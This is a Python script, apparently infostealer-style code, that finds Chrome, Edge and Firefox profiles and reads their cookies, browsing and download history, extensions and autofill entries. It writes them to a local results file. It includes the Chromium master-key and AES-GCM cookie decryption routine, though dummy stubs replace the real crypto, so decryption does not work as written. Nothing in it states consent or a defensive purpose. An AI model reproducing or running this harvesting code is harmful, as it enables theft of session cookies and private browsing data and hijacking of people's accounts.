import sys
import os
import sqlite3
import socket
import datetime
import platform
import json
import base64

# Dummy implementation of psutil using only built-in modules
class DummyCpuFreq:
    def __init__(self, current=0.0):
        self.current = current

def cpu_count(logical=True):
    return os.cpu_count() if os.cpu_count() is not None else 1

def cpu_freq():
    # Returning a dummy frequency value (in MHz)
    return DummyCpuFreq(2000.0)

class DummyVirtualMemory:
    def __init__(self, total, available, percent):
        self.total = total
        self.available = available
        self.percent = percent

def virtual_memory():
    # Dummy values: Assuming 8GB total and 4GB available
    total = 8 * 1024**3
    available = 4 * 1024**3
    percent = 50
    return DummyVirtualMemory(total, available, percent)

class psutil:
    cpu_count = staticmethod(cpu_count)
    cpu_freq = staticmethod(cpu_freq)
    virtual_memory = staticmethod(virtual_memory)

# Dummy implementation of AESGCM from the cryptography library
class AESGCM:
    def __init__(self, key):
        self.key = key
    def decrypt(self, iv, payload, associated_data):
        # Dummy decryption: simply returns the payload as is.
        return payload

# Dummy implementation of win32crypt for Windows DPAPI decryption
class DummyWin32Crypt:
    @staticmethod
    def CryptUnprotectData(encrypted, *args, **kwargs):
        # Dummy decryption: returns the encrypted data unchanged.
        return (None, encrypted)

# Try to import win32crypt (if on Windows), otherwise use dummy implementation
try:
    # In an offline environment, we assume win32crypt is not available.
    raise ImportError
except ImportError:
    win32crypt = DummyWin32Crypt()

###########################
# Advanced Decryption Helpers
###########################

def get_master_key(browser):
    """
    Retrieves the AES master key from the browser's Local State file.
    Supports Chrome and Edge.
    """
    if browser.lower() == "chrome":
        local_state_path = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Local State")
    elif browser.lower() == "edge":
        local_state_path = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data", "Local State")
    else:
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # Remove 'DPAPI' prefix
        encrypted_key = encrypted_key[5:]
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except Exception:
        return None

def decrypt_value(encrypted_value, master_key=None):
    """
    Attempts to decrypt an encrypted value using the master key with AES-GCM if possible;
    otherwise, falls back to DPAPI decryption.
    """
    try:
        if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:]
            if master_key:
                aesgcm = AESGCM(master_key)
                decrypted = aesgcm.decrypt(iv, payload, None)
                return decrypted.decode('utf-8', errors='replace')
            else:
                return "Could not decrypt"
        else:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8', errors='replace')
    except Exception:
        return "Could not decrypt"

###########################
# File Detection Helper
###########################

def find_chromium_file(browser_name, filename):
    """
    Searches for a Chromium-based browser file (e.g., Cookies, History, Login Data, Web Data)
    in the default profile folder; if not found, searches all subdirectories.
    """
    browser_name = browser_name.lower()
    if browser_name == "chrome":
        base_path = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data")
    elif browser_name == "edge":
        base_path = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data")
    else:
        return None

    default_path = os.path.join(base_path, "Default", filename)
    if os.path.exists(default_path):
        return default_path

    if os.path.exists(base_path):
        for profile in os.listdir(base_path):
            candidate = os.path.join(base_path, profile, filename)
            if os.path.exists(candidate):
                return candidate
    return None

###########################
# Data Gathering Functions
###########################

def gather_system_info():
    """Gather system hardware information."""
    info = {}
    info['Processor'] = platform.processor()
    info['Physical Cores'] = psutil.cpu_count(logical=False)
    info['Logical Cores'] = psutil.cpu_count()
    cpu_freq_val = psutil.cpu_freq()
    info['CPU Frequency'] = f"{cpu_freq_val.current:.2f} MHz" if cpu_freq_val else "Unknown"
    mem = psutil.virtual_memory()
    info['Total RAM'] = f"{mem.total / (1024**3):.2f} GB"
    info['Available RAM'] = f"{mem.available / (1024**3):.2f} GB"
    info['RAM Usage'] = f"{mem.percent}%"
    return info

def gather_browser_info():
    """
    Gather browser cookie data from Chrome, Edge, and Firefox.
    """
    browser_data = {}
    for browser in ["Chrome", "Edge"]:
        data = []
        cookie_path = find_chromium_file(browser, "Cookies")
        master_key = get_master_key(browser) if browser.lower() in ["chrome", "edge"] else None
        if cookie_path:
            try:
                conn = sqlite3.connect(cookie_path)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies")
                cookies = cursor.fetchall()
                for cookie in cookies[:5]:
                    host, name, value, encrypted_value = cookie
                    if (not value or value == "") and encrypted_value:
                        value = decrypt_value(encrypted_value, master_key)
                    data.append({"host": host, "name": name, "value": value})
                conn.close()
            except Exception as e:
                data.append({"error": str(e)})
        else:
            data.append({"error": f"Cookie file not found for {browser}."})
        browser_data[browser] = data

    # Firefox cookies
    firefox_data = []
    firefox_profiles_path = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
    if os.path.exists(firefox_profiles_path):
        profiles = [d for d in os.listdir(firefox_profiles_path)
                    if os.path.isdir(os.path.join(firefox_profiles_path, d))]
        if profiles:
            profile_path = os.path.join(firefox_profiles_path, profiles[0])
            cookie_path = os.path.join(profile_path, "cookies.sqlite")
            if os.path.exists(cookie_path):
                try:
                    conn = sqlite3.connect(cookie_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host, name, value FROM moz_cookies")
                    cookies = cursor.fetchall()
                    for cookie in cookies[:5]:
                        host, name, value = cookie
                        firefox_data.append({"host": host, "name": name, "value": value})
                    conn.close()
                except Exception as e:
                    firefox_data.append({"error": str(e)})
            else:
                firefox_data.append({"error": "Cookie file not found in Firefox profile."})
        else:
            firefox_data.append({"error": "No Firefox profiles found."})
    else:
        firefox_data.append({"error": "Firefox profiles directory not found."})
    browser_data["Firefox"] = firefox_data
    return browser_data

def convert_chrome_time(chrome_time):
    """Convert Chrome/Edge timestamp (microseconds since Jan 1, 1601) to a human-readable format."""
    try:
        epoch_start = datetime.datetime(1601, 1, 1)
        delta = datetime.timedelta(microseconds=chrome_time)
        return (epoch_start + delta).strftime('%Y-%m-%d %H:%M:%S')
    except Exception:
        return "Unknown"

def convert_firefox_time(firefox_time):
    """Convert Firefox timestamp (microseconds since Jan 1, 1970) to a human-readable format."""
    try:
        epoch_start = datetime.datetime(1970, 1, 1)
        delta = datetime.timedelta(microseconds=firefox_time)
        return (epoch_start + delta).strftime('%Y-%m-%d %H:%M:%S')
    except Exception:
        return "Unknown"

def gather_browser_history():
    """
    Gather browser history data from Chrome, Edge, and Firefox.
    """
    history_data = {}
    for browser in ["Chrome", "Edge"]:
        data = []
        history_path = find_chromium_file(browser, "History")
        if history_path:
            try:
                conn = sqlite3.connect(history_path)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 5")
                rows = cursor.fetchall()
                for row in rows:
                    url, title, last_visit_time = row
                    formatted_time = convert_chrome_time(last_visit_time)
                    data.append({"url": url, "title": title, "last_visit_time": formatted_time})
                conn.close()
            except Exception as e:
                data.append({"error": str(e)})
        else:
            data.append({"error": f"History file not found for {browser}."})
        history_data[browser] = data

    # Firefox history
    firefox_history = []
    firefox_profiles_path = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
    if os.path.exists(firefox_profiles_path):
        profiles = [d for d in os.listdir(firefox_profiles_path)
                    if os.path.isdir(os.path.join(firefox_profiles_path, d))]
        if profiles:
            profile_path = os.path.join(firefox_profiles_path, profiles[0])
            history_path = os.path.join(profile_path, "places.sqlite")
            if os.path.exists(history_path):
                try:
                    conn = sqlite3.connect(history_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 5")
                    rows = cursor.fetchall()
                    for row in rows:
                        url, title, last_visit_date = row
                        formatted_time = convert_firefox_time(last_visit_date) if last_visit_date else "Unknown"
                        firefox_history.append({"url": url, "title": title, "last_visit_time": formatted_time})
                    conn.close()
                except Exception as e:
                    firefox_history.append({"error": str(e)})
            else:
                firefox_history.append({"error": "History file not found in Firefox profile."})
        else:
            firefox_history.append({"error": "No Firefox profiles found."})
    else:
        firefox_history.append({"error": "Firefox profiles directory not found."})
    history_data["Firefox"] = firefox_history
    return history_data

def gather_download_history():
    """
    Gather download history from Chrome, Edge, and Firefox.
    For Chromium-based browsers, queries the 'downloads' table from the History database.
    For Firefox, attempts to read a 'downloads.json' file from the profile.
    """
    downloads_data = {}
    for browser in ["Chrome", "Edge"]:
        data = []
        history_path = find_chromium_file(browser, "History")
        if history_path:
            try:
                conn = sqlite3.connect(history_path)
                cursor = conn.cursor()
                cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='downloads';")
                if cursor.fetchone():
                    cursor.execute("SELECT current_path, target_path, start_time, received_bytes, total_bytes FROM downloads ORDER BY start_time DESC LIMIT 5")
                    rows = cursor.fetchall()
                    for row in rows:
                        current_path, target_path, start_time, received_bytes, total_bytes = row
                        formatted_time = convert_chrome_time(start_time)
                        data.append({
                            "current_path": current_path,
                            "target_path": target_path,
                            "start_time": formatted_time,
                            "received_bytes": received_bytes,
                            "total_bytes": total_bytes
                        })
                else:
                    data.append({"error": "Downloads table not found."})
                conn.close()
            except Exception as e:
                data.append({"error": str(e)})
        else:
            data.append({"error": f"History file not found for {browser}."})
        downloads_data[browser] = data

    # Firefox: try to read downloads.json from the profile folder
    firefox_data = []
    firefox_profiles_path = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
    if os.path.exists(firefox_profiles_path):
        profiles = [d for d in os.listdir(firefox_profiles_path) if os.path.isdir(os.path.join(firefox_profiles_path, d))]
        if profiles:
            profile_path = os.path.join(firefox_profiles_path, profiles[0])
            downloads_json_path = os.path.join(profile_path, "downloads.json")
            if os.path.exists(downloads_json_path):
                try:
                    with open(downloads_json_path, "r", encoding="utf-8") as f:
                        downloads_json = json.load(f)
                    for entry in downloads_json[:5]:
                        firefox_data.append({
                            "target": entry.get("target", ""),
                            "startTime": entry.get("startTime", ""),
                            "state": entry.get("state", "")
                        })
                except Exception as e:
                    firefox_data.append({"error": str(e)})
            else:
                firefox_data.append({"error": "downloads.json not found in Firefox profile."})
        else:
            firefox_data.append({"error": "No Firefox profiles found."})
    else:
        firefox_data.append({"error": "Firefox profiles directory not found."})
    downloads_data["Firefox"] = firefox_data
    return downloads_data

def gather_browser_extensions():
    """
    Gather installed browser extensions.
    For Chrome and Edge, reads the Extensions folder in the default profile.
    For Firefox, reads the extensions.json file from the profile.
    """
    extensions_data = {}
    for browser in ["Chrome", "Edge"]:
        data = []
        if browser.lower() == "chrome":
            base_path = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data")
        elif browser.lower() == "edge":
            base_path = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data")
        default_extensions = os.path.join(base_path, "Default", "Extensions")
        if os.path.exists(default_extensions):
            for ext_id in os.listdir(default_extensions):
                ext_path = os.path.join(default_extensions, ext_id)
                if os.path.isdir(ext_path):
                    versions = os.listdir(ext_path)
                    if versions:
                        version_folder = os.path.join(ext_path, versions[0])
                        manifest_path = os.path.join(version_folder, "manifest.json")
                        if os.path.exists(manifest_path):
                            try:
                                with open(manifest_path, "r", encoding="utf-8") as f:
                                    manifest = json.load(f)
                                data.append({
                                    "name": manifest.get("name", "Unknown"),
                                    "version": manifest.get("version", "Unknown"),
                                    "description": manifest.get("description", "No description")
                                })
                            except Exception as e:
                                data.append({"error": str(e)})
        else:
            data.append({"error": f"Extensions folder not found for {browser}."})
        extensions_data[browser] = data

    # Firefox: read extensions.json from the profile folder
    firefox_data = []
    firefox_profiles_path = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
    if os.path.exists(firefox_profiles_path):
        profiles = [d for d in os.listdir(firefox_profiles_path) if os.path.isdir(os.path.join(firefox_profiles_path, d))]
        if profiles:
            profile_path = os.path.join(firefox_profiles_path, profiles[0])
            extensions_json_path = os.path.join(profile_path, "extensions.json")
            if os.path.exists(extensions_json_path):
                try:
                    with open(extensions_json_path, "r", encoding="utf-8") as f:
                        ext_json = json.load(f)
                    addons = ext_json.get("addons", [])
                    for addon in addons[:5]:
                        firefox_data.append({
                            "name": addon.get("defaultLocale", {}).get("name", "Unknown"),
                            "version": addon.get("version", "Unknown"),
                            "description": addon.get("defaultLocale", {}).get("description", "No description")
                        })
                except Exception as e:
                    firefox_data.append({"error": str(e)})
            else:
                firefox_data.append({"error": "extensions.json not found in Firefox profile."})
        else:
            firefox_data.append({"error": "No Firefox profiles found."})
    else:
        firefox_data.append({"error": "Firefox profiles directory not found."})
    extensions_data["Firefox"] = firefox_data
    return extensions_data

def gather_autofill_data():
    """
    Gather autofill data from browsers.
    For Chrome and Edge, it looks for the 'Web Data' file and queries the 'autofill' table.
    For Firefox, it attempts to read the 'formhistory.sqlite' file and queries 'moz_formhistory'.
    """
    autofill_data = {}
    for browser in ["Chrome", "Edge"]:
        data = []
        web_data_path = find_chromium_file(browser, "Web Data")
        if web_data_path:
            try:
                conn = sqlite3.connect(web_data_path)
                cursor = conn.cursor()
                cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='autofill';")
                if cursor.fetchone():
                    cursor.execute("SELECT name, value FROM autofill LIMIT 5")
                    rows = cursor.fetchall()
                    for row in rows:
                        name, value = row
                        data.append({"name": name, "value": value})
                else:
                    data.append({"error": "Autofill table not found."})
                conn.close()
            except Exception as e:
                data.append({"error": str(e)})
        else:
            data.append({"error": f"Web Data file not found for {browser}."})
        autofill_data[browser] = data

    # Firefox autofill data
    firefox_data = []
    firefox_profiles_path = os.path.join(os.environ.get("APPDATA", ""), "Mozilla", "Firefox", "Profiles")
    if os.path.exists(firefox_profiles_path):
        profiles = [d for d in os.listdir(firefox_profiles_path) if os.path.isdir(os.path.join(firefox_profiles_path, d))]
        if profiles:
            profile_path = os.path.join(firefox_profiles_path, profiles[0])
            formhistory_path = os.path.join(profile_path, "formhistory.sqlite")
            if os.path.exists(formhistory_path):
                try:
                    conn = sqlite3.connect(formhistory_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT fieldname, value FROM moz_formhistory LIMIT 5")
                    rows = cursor.fetchall()
                    for row in rows:
                        field, value = row
                        firefox_data.append({"field": field, "value": value})
                    conn.close()
                except Exception as e:
                    firefox_data.append({"error": str(e)})
            else:
                firefox_data.append({"error": "formhistory.sqlite file not found in Firefox profile."})
        else:
            firefox_data.append({"error": "No Firefox profiles found."})
    else:
        firefox_data.append({"error": "Firefox profiles directory not found."})
    autofill_data["Firefox"] = firefox_data
    return autofill_data

def main():
    # Gather all information
    results = {
        "system_info": gather_system_info(),
        "browser_info": gather_browser_info(),
        "browser_history": gather_browser_history(),
        "download_history": gather_download_history(),
        "browser_extensions": gather_browser_extensions(),
        "autofill_data": gather_autofill_data()
    }
    # Write the results to a file called 'results'
    try:
        with open("results", "w", encoding="utf-8") as f:
            json.dump(results, f, indent=4)
    except Exception as e:
        print(f"Error writing results to file: {e}")

if __name__ == '__main__':
    main()